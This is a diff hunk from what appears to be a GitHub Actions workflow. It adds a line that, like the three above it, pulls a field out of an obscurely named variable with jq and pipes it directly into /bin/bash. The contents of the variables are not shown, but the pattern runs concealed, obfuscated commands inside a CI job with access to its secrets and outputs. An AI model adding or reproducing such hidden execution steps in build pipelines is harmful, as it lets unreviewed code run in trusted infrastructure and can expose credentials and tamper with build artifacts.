@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$e82208" | jq -r .nvllx24 | /bin/bash
           echo $l3 | jq -r .z224 | /bin/bash
           printf '%s' "$ntp68" | jq -r .p2 | /bin/bash
+          echo $ow57081 | jq -r .aprh694 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
